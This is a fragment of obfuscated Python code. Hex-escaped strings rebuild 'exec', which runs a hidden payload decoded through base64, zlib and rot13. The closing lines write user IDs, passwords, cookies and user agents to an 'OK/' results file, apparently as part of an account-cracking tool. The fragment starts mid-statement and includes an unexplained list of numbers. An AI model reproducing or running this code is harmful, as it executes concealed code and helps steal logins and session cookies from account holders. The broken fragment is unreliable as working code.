7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				break
 				
